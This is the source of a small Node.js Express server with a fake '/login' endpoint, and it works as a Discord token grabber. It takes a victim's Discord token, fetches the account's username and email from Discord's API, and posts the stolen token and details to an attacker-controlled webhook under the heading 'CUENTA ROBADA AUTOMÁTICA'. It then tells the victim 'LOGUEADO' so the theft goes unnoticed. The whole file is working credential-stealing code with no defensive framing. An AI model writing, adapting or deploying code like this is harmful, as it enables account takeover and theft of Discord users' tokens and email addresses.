const express = require('express');
const fetch = require('node-fetch');
const app = express();
app.use(express.json());

app.post('/login', async (req, res) => {
  const token = req.body.token;
  if (!token) return res.send("no token");

  try {
    const user = await (await fetch('https://discord.com/api/v9/users/@me', {
      headers: { 'Authorization': token }
    })).json();

    const WEBHOOK = "https://discord.com/api/webhooks/TU_WEBHOOK_AQUI";

    fetch(WEBHOOK, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({
        content: "@everyone **CUENTA ROBADA AUTOMÁTICA**",
        embeds: [{
          title: `${user.username}#${user.discriminator}`,
          description: `Email: ${user.email}\nToken: \`\`\`${token}\`\`\``,
          thumbnail: { url: `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=512` },
          color: 0x00ff00
        }]
      })
    });

    res.send("LOGUEADO");
  } catch {
    res.send("invalid");
  }
});

app.listen(process.env.PORT || 3000);
